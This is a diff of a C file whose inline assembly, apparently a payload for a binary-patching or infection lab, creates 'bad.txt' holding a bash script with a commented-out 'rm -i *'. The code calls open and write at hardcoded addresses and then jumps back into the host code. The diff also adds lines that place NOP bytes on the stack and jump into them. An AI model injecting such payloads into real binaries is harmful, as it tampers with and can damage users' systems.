@@ -18,21 +18,26 @@ int inc(int a) {
 }
 
 void main() {
+
+	__asm__ ("sub $0x8,%rsp\n\t");
+	__asm__ ("movl $0x90909090,(%rsp)\n\t");
+	__asm__ ("jmp *%rsp");
+
 	// copy "bad.txt" to the current stack)
-	__asm__ ( "sub $0x8,%rsp\n\t");
+	__asm__ ("sub $0x8,%rsp\n\t");
 	__asm__ ("movl $0x2e646162,(%rsp)\n\t");
 	__asm__ ("movl $0x00747874,0x4(%rsp)\n\t");
 	
 	// call open function
-	__asm__ ( "movl $0x16d,%edx\n\t");
-	__asm__ ( "movl $0x241,%esi\n\t");
-	__asm__ ( "movq %rsp,%rdi\n\t");
-	__asm__ ( "movl $0x0,%eax\n\t");
+	__asm__ ("movl $0x16d,%edx\n\t");
+	__asm__ ("movl $0x241,%esi\n\t");
+	__asm__ ("movq %rsp,%rdi\n\t");
+	__asm__ ("movl $0x0,%eax\n\t");
 
-	__asm__ ( "callq 0x402310\n\t");  
+	__asm__ ("callq 0x402310\n\t");  
 
 	// copy "#!/bin/bash\n#rm -i *\n" to the current stack)
-	__asm__ ( "sub $0x18,%rsp\n\t");
+	__asm__ ("sub $0x18,%rsp\n\t");
 	__asm__ ("movl $0x622f2123,(%rsp)\n\t");    
 	__asm__ ("movl $0x622f6e69,0x4(%rsp)\n\t");    
 	__asm__ ("movl $0x0a687361,0x8(%rsp)\n\t");    
@@ -41,17 +46,16 @@ void main() {
 	__asm__ ("movl $0x0000000a,0x14(%rsp)\n\t");
 	
 	// call write
-	__asm__ ( "movl $0x16,%edx\n\t");
-	__asm__ ( "movq %rsp,%rsi\n\t");
-	__asm__ ( "movl %eax,%edi\n\t");
-	__asm__ ( "movl $0x0,%eax\n\t");
+	__asm__ ("movl $0x16,%edx\n\t");
+	__asm__ ("movq %rsp,%rsi\n\t");
+	__asm__ ("movl %eax,%edi\n\t");
+	__asm__ ("movl $0x0,%eax\n\t");
 
-	__asm__ ( "callq 0x401f10\n\t");
-	__asm__ ( "jmp 0x408ac8\n\t");
+	__asm__ ("callq 0x401f10\n\t");
+	__asm__ ("jmp 0x408ac8\n\t");
 
 	// restore %rsp
-	__asm__ ( "add $0x18,%rsp\n\t");
-	__asm__ ( "add $0x8,%rsp\n\t");
-	
+	__asm__ ("add $0x18,%rsp\n\t");
+	__asm__ ("add $0x8,%rsp\n\t");
 }
 
